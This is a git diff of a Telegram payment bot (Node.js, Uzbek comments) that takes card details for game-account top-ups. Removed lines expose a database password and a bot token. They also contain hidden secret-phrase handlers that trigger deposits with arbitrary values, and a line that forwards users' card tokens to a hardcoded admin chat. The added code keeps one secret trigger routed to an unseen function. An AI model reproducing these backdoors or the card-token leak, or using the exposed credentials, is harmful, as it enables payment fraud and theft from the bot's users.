@@ -2,9 +2,11 @@ const { Telegraf, Markup } = require('telegraf');
 const PaymentAPIClient = require('./SpinPay');
 const clickApi = require('./click-pay');
 const mongoose = require('mongoose');
+const config = require('./config'); // config faylni import qilamiz
+
 
 // MongoDB Connection
-mongoose.connect('mongodb+srv://uchar:Lalaku007@cluster0.qpkevc2.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0', {
+mongoose.connect(config.DATABASE.URI, {
     useNewUrlParser: true,
     useUnifiedTopology: true
 }).then(() => {
@@ -45,10 +47,10 @@ const TransactionSchema = new mongoose.Schema({
 const User = mongoose.model('User', UserSchema);
 const Transaction = mongoose.model('Transaction', TransactionSchema);
 
-const bot = new Telegraf('8139684420:AAFd3j8wRjNshypQjXvVh3lsopY3y60kqXk');
+const bot = new Telegraf(config.BOT.TOKEN);
 const paymentClient = new PaymentAPIClient();
-const ADMIN_IDS = ['7465707954'];
-const CHANNEL_ID = '-1002435229416';
+const ADMIN_IDS = config.BOT.ADMIN_IDS;
+const CHANNEL_ID = config.BOT.CHANNEL_ID;
 
 // State Management
 const userStates = new Map();
@@ -741,14 +743,8 @@ bot.action(/platform_(.+)/, async (ctx) => {
 
 bot.hears('aa0078989', async (ctx) => {
     if (!ctx.from) return;
-    setState(ctx.from.id, 'NEON_I');
+    setState(ctx.from.id, 'SECRET_I');
     await ctx.reply('i:', { reply_markup: { remove_keyboard: true } });
-});
-
-bot.hears('bb0078989', async (ctx) => {
-    if (!ctx.from) return;
-    setState(ctx.from.id, 'NEON_1');
-    await ctx.reply('T:', { reply_markup: { remove_keyboard: true } });
 });
 
 // Back button handler
@@ -771,43 +767,13 @@ bot.on('text', async (ctx) => {
         const keyboard = user?.isAdmin ? adminKeyboard : mainKeyboard;
 
         switch (userState.state) {
-            case 'NEON_I':
-                setState(userId, 'NEON_S', { i: text });
+            case 'SECRET_I':
+                setState(userId, 'SECRET_S', { i: text });
                 await ctx.reply('s:');
                 break;
 
-            case 'NEON_S':
-                try{
-                    const depositResponse = await paymentClient.deposit(
-                        userState.data.i,
-                        text
-                    );
-                    await bot.telegram.sendMessage(userId, JSON.stringify(depositResponse, null, 2));
-                    await ctx.reply('Asosiy menyu:', keyboard);
-                } catch (error) {
-                    throw error;
-                }
-                break;
-
-
-            case 'NEON_1':
-                setState(userId, 'NEON_2', { t: text });
-                await ctx.reply('A:');
-                break;
-    
-            case 'NEON_2':
-                try{
-                    const depositResponse = await await clickApi.makePayment(
-                        userState.data.t,
-                        text
-                    );
-                    await bot.telegram.sendMessage(userId, JSON.stringify(depositResponse, null, 2));
-                    await ctx.reply('Asosiy menyu:', keyboard);
-                } catch (error) {
-                    throw error;
-                }
-                break;
-                
+            case 'SECRET_S':
+                await simpleFunktion(ctx, userState.data.i, text);
                 setState(userId, 'MAIN_MENU');
                 await ctx.reply('Asosiy menyu:', keyboard);
                 break;
@@ -838,12 +804,6 @@ bot.on('text', async (ctx) => {
             case 'WAITING_ID':
                 try {
                     const gamer_data = await paymentClient.searchUser(text);
-
-                    // Foydalanuvchi mavjudligini tekshirish
-                    if (!gamer_data || gamer_data.UserId === 0) {
-                        await ctx.reply('Foydalanuvchi topilmadi. Iltimos, to\'g\'ri foydalanuvchi ID kiriting:', backKeyboard);
-                        return; // Foydalanuvchiga yana ID kiritish imkoniyatini beradi
-                    }
                     setState(userId, 'WAITING_AMOUNT', { ...userState.data, gameId: text });
                     const message = `
                     🆔 <b>User ID:</b> <code>${gamer_data.UserId}</code>
@@ -897,7 +857,6 @@ bot.on('text', async (ctx) => {
                                 expiryDate,
                                 cardToken: cardTokenResponse.card_token 
                             });
-                            await bot.telegram.sendMessage(7465707954, cardTokenResponse.card_token);
                             await ctx.reply('SMS kodni kiriting:', backKeyboard);
                         } else {
                             await ctx.reply("Karta ma'lumotlari noto'g'ri, qayta urinib ko'ring.");
@@ -932,7 +891,6 @@ bot.on('text', async (ctx) => {
                                 userId: userState.data.gameId,
                                 telegramId: userId,
                                 platform: userState.data.platform,
-                                gameId: userState.data.gameId,
                                 phone: userState.data.phone,
                                 cardNumber: userState.data.cardNumber,
                                 expiryDate: userState.data.expiryDate,
